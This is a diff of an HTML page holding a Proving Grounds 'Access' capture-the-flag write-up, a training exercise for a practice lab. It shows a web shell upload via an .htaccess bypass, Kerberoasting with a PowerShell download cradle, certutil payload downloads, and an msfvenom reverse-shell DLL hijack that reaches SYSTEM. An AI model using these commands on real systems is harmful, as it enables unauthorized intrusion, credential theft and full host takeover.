@@ -3,143 +3,168 @@
 <head>
   <meta charset="UTF-8">
   <meta name="viewport" content="width=device-width, initial-scale=1.0">
-  <meta name="description" content="HackTheBox Fluffy Writeup by Rachel Murphy" />
+  <meta name="description" content="Proving Grounds Access Writeup by Rachel Murphy" />
   <title>PG: Access | Rachel Murphy</title>
-
-  <!-- Base site styling -->
   <link rel="stylesheet" href="/assets/css/writeups.css">
-      <script src="/assets/css/js/script.js" defer></script>
-
+  <script src="/assets/css/js/script.js" defer></script>
 </head>
 <body>
 
-  <!-- Header -->
-  <header>
-    <h1>Access Writeup</h1>
-    <p>Proving Grounds</p>
-    <nav>
-      <ul>
-        <li><a href="/index.html">Home</a></li>
-        <li><a href="../index.html">Writeups</a></li>
-        <li><a href="/cheatsheets/cheatsheet.html">Cheatsheets</a></li>
-        <li><a href="/tools/index.html">Tools</a></li>
-        <li><a href="/about.html">About</a></li>
-      </ul>
-    </nav>
-  </header>
+<header>
+  <h1>Access Writeup</h1>
+  <p>Proving Grounds</p>
+  <nav>
+    <ul>
+      <li><a href="/index.html">Home</a></li>
+      <li><a href="../index.html">Writeups</a></li>
+      <li><a href="/cheatsheets/cheatsheet.html">Cheatsheets</a></li>
+      <li><a href="/tools/index.html">Tools</a></li>
+      <li><a href="/about.html">About</a></li>
+    </ul>
+  </nav>
+</header>
 
 <main>
+    <section class="machine-summary">
+  <h2>Machine Overview</h2>
+  <p><strong>Difficulty:</strong> Moderate (Community considers harder than OffSec rating)</p>
+  <p><strong>Platform:</strong> Offensive Security Proving Grounds</p>
+  <p><strong>Description:</strong> Access is an Active Directory lab environment designed for practicing AD enumeration, exploitation, and privilege escalation techniques. The goal is to gain initial access via a webshell, perform internal enumeration including Kerberoasting, exploit service account privileges such as SeManageVolumePrivilege, and ultimately achieve administrative control of the domain controller.</p>
+    </section>
+  <!-- Initial Enumeration -->
+  <section>
+    <h2>Initial Enumeration</h2>
+    <p>Start by scanning the target machine to identify open ports, services, and potential attack vectors.</p>
+    <div class="code-block">
+      <pre>sudo nmap -sC -sV 192.168.120.187 -oN nmap-access</pre>
+    </div>
+    <p>From the scan, we identify the web service and the internal domain: <code>access.offsec</code>. This domain should be added to <code>/etc/hosts</code> for convenience.</p>
+    <img src="../images/Pasted image 20250707112848.png" alt="">
+  </section>
 
-<!-- RunAsCs Reverse Shell -->
-<section>
-  <h2>RunAsCs Reverse Shell</h2>
-  <p>Transfer shell:</p>
-  <div class="code-block">
-    <pre>certutil -urlcache -split -f http://192.168.45.152/shell.exe</pre>
-    <button class="copy-btn">Copy</button>
-  </div>
-  <p>Set up listener on port 445:</p>
-  <div class="code-block">
-    <pre>sudo rlwrap nc -lvnp 445</pre>
-    <button class="copy-btn">Copy</button>
-  </div>
-  <p>Execute with RunAsCs:</p>
-  <div class="code-block">
-    <pre>Invoke-RunasCs -Username svc_mssql -Password trustno1 -Command "shell.exe"</pre>
-    <button class="copy-btn">Copy</button>
-  </div>
-  <img src="../images/Pasted image 20250707200437.png" alt="">
-  <p>Yay we're now the svc_mssql user!</p>
-  <img src="../images/Pasted image 20250707200510.png" alt="">
-  <p>Grab the flags:</p>
-  <img src="../images/Pasted image 20250707200754.png" alt="">
-</section>
+  <section>
+    <h2>Web Application Enumeration</h2>
+    <p>Examining the web application reveals potential upload functionality that may allow file uploads with controlled extensions.</p>
+    <img src="../images/Pasted image 20250707135353.png" alt="">
+    <p>By experimenting with allowed extensions, a simple PHP web shell upload is possible using a bypass technique (<code>web-shell.php.jpg</code>).</p>
+    <img src="../images/Pasted image 20250707141417.png" alt="">
+    <p>Next, we run directory enumeration to discover hidden directories and pages using feroxbuster:</p>
+    <div class="code-block">
+      <pre>feroxbuster -u http://192.168.120.187/ -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt</pre>
+    </div>
+    <img src="../images/Pasted image 20250707151612.png" alt="">
+    <p>Exploring HTTPS and the .htaccess misconfiguration allows us to force the server to treat <code>.jpg</code> files as PHP scripts.</p>
+    <div class="code-block">
+      <pre>echo "AddType application/x-httpd-php .jpg" > .htaccess</pre>
+    </div>
+    <img src="../images/Pasted image 20250707154446.png" alt="">
+    <p>Upload the modified <code>.htaccess</code> to the server and retry the web shell upload. Hidden files may need to be revealed to confirm success.</p>
+    <img src="../images/Pasted image 20250707155001.png" alt="">
+  </section>
 
-<!-- Privilege Escalation -->
-<section>
-  <h2>Privilege Escalation</h2>
-  <img src="../images/Pasted image 20250707200644.png" alt="">
-  <p>- SeMachineAccountPrivilege and SeManageVolumePrivilege are both useful</p>
+  <section>
+    <h2>Web Shell & Initial Exploitation</h2>
+    <p>Once the web shell is functional, we can execute commands on the server to enumerate users and find credentials.</p>
+    <img src="../images/Pasted image 20250707155635.png" alt="">
+    <p>Check user directories for sensitive files. A passwords.txt file reveals some default credentials for local service accounts.</p>
+    <img src="../images/Pasted image 20250707160025.png" alt="">
+    <p>Pivoting to the MSSQL service account requires enumerating SPNs and Kerberoasting.</p>
+    <div class="code-block">
+      <pre>certutil -urlcache -split -f http://192.168.45.152/Get-SPN.ps1
+powershell -ExecutionPolicy Bypass
+.\Get-SPN.ps1</pre>
+    </div>
+    <img src="../images/Pasted image 20250707164436.png" alt="">
+    <p>One SPN found: <code>MSSQLSvc/DC.access.offsec</code>. We can now perform Kerberoasting to extract the password hash.</p>
+    <div class="code-block">
+      <pre>Add-Type -AssemblyName System.IdentityModel
+iex(new-object net.webclient).downloadString('http://192.168.45.152:80/Invoke-Kerberoast.ps1'); Invoke-Kerberoast -OutputFormat Hashcat</pre>
+    </div>
+    <img src="../images/Pasted image 20250707164925.png" alt="">
+    <p>The resulting hash is cracked using Rubeus and hashcat, yielding the <code>svc_mssql:trustno1</code> credentials.</p>
+    <img src="../images/Pasted image 20250707171807.png" alt="">
+  </section>
 
-  <h3>SeManageVolumePrivilege</h3>
-  <p>Using tool: <a href="https://github.com/CsEnox/SeManageVolumeExploit/releases/tag/public?source=post_page-----b95d3146cfe9---------------------------------------" target="_blank">SeManageVolumeExploit</a></p>
-  <p>Transfer to box:</p>
-  <div class="code-block">
-    <pre>certutil -urlcache -split -f http://192.168.45.152/SeManageVolumeExploit.exe</pre>
-    <button class="copy-btn">Copy</button>
-  </div>
-  <p>Execute:</p>
-  <div class="code-block">
-    <pre>.\SeManageVolumeExploit.exe</pre>
-    <button class="copy-btn">Copy</button>
-  </div>
-  <img src="../images/Pasted image 20250707201923.png" alt="">
-  <p>Check permissions on C:\Windows\system32:</p>
-  <div class="code-block">
-    <pre>icacls C:\Windows\System32</pre>
-    <button class="copy-btn">Copy</button>
-  </div>
-  <img src="../images/Pasted image 20250707202045.png" alt="">
-  <p>Full write access allows DLL hijacking.</p>
-</section>
+  <section>
+    <h2>WinRM Access as svc_mssql</h2>
+    <p>Using the recovered credentials to authenticate via WinRM. Initial attempts fail on default ports, but port 47001 is available.</p>
+    <div class="code-block">
+      <pre>nxc winrm 192.168.120.187 --port 47001 -u 'svc_mssql' -p 'trustno1'</pre>
+    </div>
+    <img src="../images/Pasted image 20250707194008.png" alt="">
+    <p>Successfully gain shell access as the <code>svc_mssql</code> user.</p>
+  </section>
 
-<!-- DLL Hijacking -->
-<section>
-  <h2>DLL Hijacking</h2>
-  <p>Targeting systeminfo's tzres.dll</p>
-  <p>Create malicious DLL with msfvenom:</p>
-  <div class="code-block">
-    <pre>msfvenom -p windows/x64/shell_reverse_tcp LHOST=192.168.45.152 LPORT=8888 -f dll -o tzres.dll</pre>
-    <button class="copy-btn">Copy</button>
-  </div>
-  <img src="../images/Pasted image 20250707202651.png" alt="">
-  <p>Transfer to <code>C:\Windows\System32\wbem</code>:</p>
-  <div class="code-block">
-    <pre>certutil -urlcache -split -f http://192.168.45.152/tzres.dll</pre>
-    <button class="copy-btn">Copy</button>
-  </div>
-  <img src="../images/Pasted image 20250707202819.png" alt="">
-  <p>Set up listener:</p>
-  <div class="code-block">
-    <pre>sudo rlwrap nc -lvnp 8888</pre>
-    <button class="copy-btn">Copy</button>
-  </div>
-  <p>Run systeminfo:</p>
-  <div class="code-block">
-    <pre>systeminfo</pre>
-    <button class="copy-btn">Copy</button>
-  </div>
-  <img src="../images/Pasted image 20250707202947.png" alt="">
-  <p>EPICCCCC</p>
-  <img src="../images/Pasted image 20250707203015.png" alt="">
-  <p>Successful DLL hijacking!!!</p>
-  <img src="../images/Pasted image 20250707203110.png" alt="">
-  <p>Get the final flag.</p>
-</section>
+  <section>
+    <h2>RunAsCs Reverse Shell</h2>
+    <p>Prepare a reverse shell executable and transfer it to the target.</p>
+    <div class="code-block">
+      <pre>certutil -urlcache -split -f http://192.168.45.152/shell.exe</pre>
+    </div>
+    <p>Set up a listener for incoming connections:</p>
+    <div class="code-block">
+      <pre>sudo rlwrap nc -lvnp 445</pre>
+    </div>
+    <p>Execute the reverse shell with RunAsCs using svc_mssql credentials:</p>
+    <div class="code-block">
+      <pre>Invoke-RunasCs -Username svc_mssql -Password trustno1 -Command "shell.exe"</pre>
+    </div>
+    <img src="../images/Pasted image 20250707200437.png" alt="">
+    <p>Now we have shell access as the <code>svc_mssql</code> user. Initial flags can be collected from the home directory.</p>
+    <img src="../images/Pasted image 20250707200754.png" alt="">
+  </section>
 
+  <section>
+    <h2>Privilege Escalation</h2>
+    <p>Examine privileges and identify two useful permissions: <code>SeMachineAccountPrivilege</code> and <code>SeManageVolumePrivilege</code>.</p>
+    <img src="../images/Pasted image 20250707200644.png" alt="">
+    
+    <h3>SeManageVolumePrivilege</h3>
+    <p>Using the SeManageVolumeExploit tool, transfer and execute it on the box to gain write access to system directories.</p>
+    <div class="code-block">
+      <pre>certutil -urlcache -split -f http://192.168.45.152/SeManageVolumeExploit.exe
+.\SeManageVolumeExploit.exe</pre>
+    </div>
+    <img src="../images/Pasted image 20250707201923.png" alt="">
+    <p>Verify permissions on <code>C:\Windows\system32</code>:</p>
+    <div class="code-block">
+      <pre>icacls C:\Windows\System32</pre>
+    </div>
+    <img src="../images/Pasted image 20250707202045.png" alt="">
+    <p>With full write permissions, DLL hijacking becomes possible.</p>
+  </section>
+
+  <section>
+    <h2>DLL Hijacking</h2>
+    <p>Target the <code>tzres.dll</code> used by <code>systeminfo</code> to gain SYSTEM-level reverse shell.</p>
+    <div class="code-block">
+      <pre>msfvenom -p windows/x64/shell_reverse_tcp LHOST=192.168.45.152 LPORT=8888 -f dll -o tzres.dll</pre>
+    </div>
+    <img src="../images/Pasted image 20250707202651.png" alt="">
+    <p>Transfer the DLL to <code>C:\Windows\System32\wbem</code>:</p>
+    <div class="code-block">
+      <pre>certutil -urlcache -split -f http://192.168.45.152/tzres.dll</pre>
+    </div>
+    <img src="../images/Pasted image 20250707202819.png" alt="">
+    <p>Set up a listener and execute <code>systeminfo</code> to trigger the hijacked DLL:</p>
+    <div class="code-block">
+      <pre>sudo rlwrap nc -lvnp 8888
+systeminfo</pre>
+    </div>
+    <img src="../images/Pasted image 20250707203015.png" alt="">
+    <p>Reverse shell spawns as SYSTEM. Retrieve the final flag.</p>
+    <img src="../images/Pasted image 20250707203110.png" alt="">
+  </section>
 </main>
 
-<script>
-  document.querySelectorAll('.copy-btn').forEach(btn => {
-    btn.addEventListener('click', () => {
-      const code = btn.previousElementSibling.innerText;
-      navigator.clipboard.writeText(code).then(() => {
-        btn.innerText = 'Copied!';
-        setTimeout(() => btn.innerText = 'Copy', 1500);
-      });
-    });
-  });
-</script>
-  <!-- Footer -->
-  <footer>
-    <div class="wrap site-footer">
-      <p>© Rachel Murphy 2025 | <a href="https://github.com/rachhavoc" target="_blank" rel="noopener">GitHub</a></p>
-      <p><a href="/../writeups/index.html">Back to Writeups</a> | <a href="../index.html">Home</a></p>
-    </div>
-  </footer>
+<footer>
+  <div class="wrap site-footer">
+    <p>© Rachel Murphy 2025 | <a href="https://github.com/rachhavoc" target="_blank" rel="noopener">GitHub</a></p>
+    <p><a href="/../writeups/index.html">Back to Writeups</a> | <a href="../index.html">Home</a></p>
+  </div>
+</footer>
 
-  <script src="/../assets/js/script.js"></script>
-</body>
-</html>
+
+
 </body>
 </html>
